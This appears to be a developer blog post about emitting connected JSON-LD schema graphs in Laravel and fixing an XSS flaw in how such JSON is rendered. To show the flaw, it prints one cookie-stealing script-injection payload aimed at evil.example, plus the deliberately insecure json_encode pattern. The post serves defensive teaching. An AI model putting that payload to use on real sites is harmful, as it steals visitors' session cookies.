---
title: "JSON-LD schema graphs in Laravel: @id linking and output you can't break out of"
description: "How to emit a connected JSON-LD graph (Organization → WebSite → WebPage) from Laravel, and why your json_encode flags are a security decision."
---

# JSON-LD schema graphs in Laravel: `@id` linking and output you can't break out of

Most Laravel apps that emit JSON-LD emit *islands*: an `Article` here, an
`Organization` there, each in its own `<script>` block, none referencing the
others. Search engines accept it, but you're leaving the best part of the
format unused — JSON-**LD** is linked data, and the linking is what lets a
crawler understand that this page belongs to this website which is published
by this organization.

This post covers the two things we got wrong before getting them right in
production: building a **connected graph with stable `@id`s**, and the
**escaping bug** that makes naive JSON-LD output an XSS vector. Both solutions
ship in [rankbeam/laravel-seo](https://github.com/rankbeam/laravel-seo) (MIT),
and all class names below are real — you can read the source.

## The graph: three nodes, three conventions

The minimal useful graph is Organization → WebSite → WebPage, cross-referenced
by `@id`. The `@id` value is just a URI that's *stable and unique* — the
convention that works is your site URL plus a fragment:

| Node | `@id` | Links |
|---|---|---|
| Organization | `{site_url}#organization` | — |
| WebSite | `{site_url}#website` | `publisher` → `#organization` |
| WebPage | `{canonical_url}#webpage` | `isPartOf` → `#website`, `about` → `#organization` |

Two properties of this scheme matter. First, the Organization and WebSite
`@id`s are **identical on every page** of the site — that's what lets a
crawler merge the nodes it sees on page A and page B into one entity. Second,
the WebPage `@id` derives from the **canonical** URL, not the request URL, so
tracking-parameter variants of a page don't mint phantom page entities.

In the package this is `Rankbeam\Seo\Services\Schema\SchemaGraph`:

```php
use Rankbeam\Seo\Facades\SEO;
use Rankbeam\Seo\Services\Schema\SchemaCollection;
use Rankbeam\Seo\Services\Schema\SchemaGraph;

$seo   = SEO::resolve($post);
$graph = new SchemaGraph();

$schemas = SchemaCollection::make()
    ->add($graph->organization())   // @id: {app_url}#organization
    ->add($graph->webSite())        // @id: {app_url}#website, publisher → #organization
    ->add($graph->webPage($seo));   // @id: {canonical}#webpage, isPartOf → #website
```

```blade
{!! $schemas->toScript() !!}
```

Here's the actual output from the package's demo application (abridged) — note
how the references resolve across nodes:

```json
[
  {
    "@context": "https://schema.org",
    "@id": "https://example.com#organization",
    "@type": "Organization",
    "name": "Merchant Demo",
    "url": "https://example.com"
  },
  {
    "@context": "https://schema.org",
    "@id": "https://example.com#website",
    "@type": "WebSite",
    "publisher": { "@id": "https://example.com#organization" }
  },
  {
    "@context": "https://schema.org",
    "@id": "https://example.com/blog/seo-best-practices#webpage",
    "@type": "WebPage",
    "name": "10 SEO Best Practices That Still Work in 2026",
    "datePublished": "2026-06-10T11:19:29+00:00",
    "isPartOf": { "@id": "https://example.com#website" },
    "about":    { "@id": "https://example.com#organization" }
  }
]
```

The WebPage node's content (name, description, dates, canonical) comes from
the resolved SEO data, so the JSON-LD can never disagree with the meta tags on
the same page — they're produced from the same value object.

Two small production details baked into `SchemaGraph` that are easy to miss
when hand-rolling:

- **Empty values are filtered out** (`SchemaGraph::filter()`), so partial
  configuration yields valid smaller nodes instead of `"logo": null`.
- **The site-wide fallback OG image is suppressed** in
  `primaryImageOfPage` (`SchemaGraph::pageImageUrl()`): the default share
  image says nothing about *this* page, and emitting it on every page
  pollutes the graph with a meaningless image entity.

Typed builders (`ArticleSchema::fromModel($post)`, `ProductSchema`,
`BreadcrumbSchema::fromModelAncestors($page)` — with a loop guard for cyclic
parent chains, learned the hard way) hang richer nodes off the same graph.
See the [schema guide](/guide/schema) for the full list.

## The escaping bug: `</script>` is data, until it isn't

Now the security part. JSON-LD goes inside a `<script>` element, and inside a
`<script>` element **no HTML entity escaping applies**. The browser scans for
one thing only: the literal sequence `</script>`, which terminates the
element — *regardless of JSON string context*. So if any value in your schema
contains user-influenced content:

```php
// DO NOT do this
echo '<script type="application/ld+json">'
    . json_encode($schema)
    . '</script>';
```

…then a title like

```
My post </script><script>document.location='https://evil.example/?'+document.cookie</script>
```

ends your JSON-LD block early and injects a live script. `json_encode` does
**not** save you here — by default it escapes quotes and backslashes, but `<`
and `>` pass through untouched, and `{"title":"…<\/script>…"}` only happens
for the slash, which is irrelevant: the browser's scanner matches `</script>`
in the raw bytes, and the default flags leave those bytes intact.

We found this as a real bug during the package's pre-release security review:
the HTML tag renderer escaped its meta attributes correctly, while the schema
collection's `toScript()` path shipped raw `json_encode` output. The fix is a
set of flags, now applied identically in both code paths
(`SchemaCollection::JSON_FLAGS` and `TagRenderer::SCHEMA_JSON_FLAGS`):

```php
protected const JSON_FLAGS = JSON_UNESCAPED_SLASHES
    | JSON_UNESCAPED_UNICODE
    | JSON_HEX_TAG    // < and > become \u003C and \u003E — the one that matters
    | JSON_HEX_AMP
    | JSON_HEX_APOS
    | JSON_HEX_QUOT;
```

`JSON_HEX_TAG` encodes `<` and `>` as the JSON unicode escapes `\u003C` / `\u003E`
— they decode to the same characters for any JSON-LD consumer, but mean the raw
bytes `</script>` can never appear in your markup. The HEX_AMP/APOS/QUOT
flags additionally harden the payload for attribute contexts. The behavior is
locked by regression tests asserting that no literal `</script>` survives in
rendered output for hostile titles, descriptions, and schema values.

The practical rule:

> If you render JSON inside a `<script>` element — JSON-LD, bootstrap data,
> anything — `JSON_HEX_TAG` is not optional. And don't bypass your hardened
> renderer by `json_encode`-ing schema arrays yourself in a one-off Blade
> view; the one-off is where the bug lives.

(Laravel's own `Js::from()` helper exists for the same reason on the
JavaScript-data side; JSON-LD blocks tend to be hand-rolled and miss it.)

## Putting it together

A full article page in an app using the package:

```php
$seo   = SEO::resolve($post);
$graph = new SchemaGraph();

$schemas = SchemaCollection::make()
    ->add($graph->organization())
    ->add($graph->webSite())
    ->add($graph->webPage($seo))
    ->add(ArticleSchema::fromModel($post)->toArray())
    ->add(BreadcrumbSchema::fromArray([
        ['name' => 'Home', 'url' => '/'],
        ['name' => 'Blog', 'url' => '/blog'],
        ['name' => $post->title, 'url' => "/blog/{$post->slug}"],
    ])->toArray());
```

Validate the result with Google's Rich Results Test or schema.org's
validator — the linked `@id`s show up as a single connected entity tree
rather than disconnected islands.

```bash
composer require rankbeam/laravel-seo
```

The [quickstart](/guide/quickstart) covers install to rendered head in five
minutes; the [schema graph guide](/guide/schema) covers every builder.
